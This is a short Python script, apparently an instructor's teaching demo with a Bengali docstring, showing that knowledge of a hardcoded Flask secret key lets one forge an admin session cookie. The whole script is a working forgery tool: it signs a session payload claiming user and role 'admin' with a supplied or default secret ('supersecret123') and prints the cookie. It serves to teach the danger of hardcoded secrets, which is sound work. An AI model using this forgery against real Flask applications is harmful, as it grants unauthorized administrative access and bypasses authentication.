"""ইন্সট্রাক্টর ডেমো: হার্ডকোড করা secret_key জানলে অ্যাডমিন সেশন কুকি বানানো যায়।
ব্যবহার: python tools/forge_cookie.py [secret]
"""
import sys

from flask import Flask
from flask.sessions import SecureCookieSessionInterface

secret = sys.argv[1] if len(sys.argv) > 1 else "supersecret123"
app = Flask(__name__)
app.secret_key = secret
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
print(serializer.dumps({"user": "admin", "role": "admin"}))
